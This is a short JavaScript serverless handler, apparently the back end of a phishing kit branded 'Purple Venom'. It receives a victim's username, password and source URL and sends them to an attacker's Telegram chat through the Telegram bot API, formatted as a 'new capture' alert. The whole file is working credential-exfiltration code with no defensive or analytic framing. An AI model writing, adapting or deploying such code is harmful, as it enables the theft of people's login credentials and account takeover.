export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const { user, pass, url } = req.body;
  
  // Tes identifiants officiels
  const BOT_TOKEN = process.env.TELEGRAM_TOKEN; 
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  const texte = `
🚀 **PURPLE VENOM : NOUVELLE CAPTURE** 🚀
━━━━━━━━━━━━━━━━━━
👤 **UTILISATEUR** : \`${user}\`
🔑 **MOT DE PASSE** : \`${pass}\`
🔗 **SOURCE URL** : ${url}
━━━━━━━━━━━━━━━━━━
📍 *Système : Anastasia Protocol v2.1*
  `;

  try {
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: texte,
        parse_mode: "Markdown"
      })
    });

    return res.status(200).json({ status: "success" });
  } catch (error) {
    return res.status(500).json({ status: "error" });
  }
}
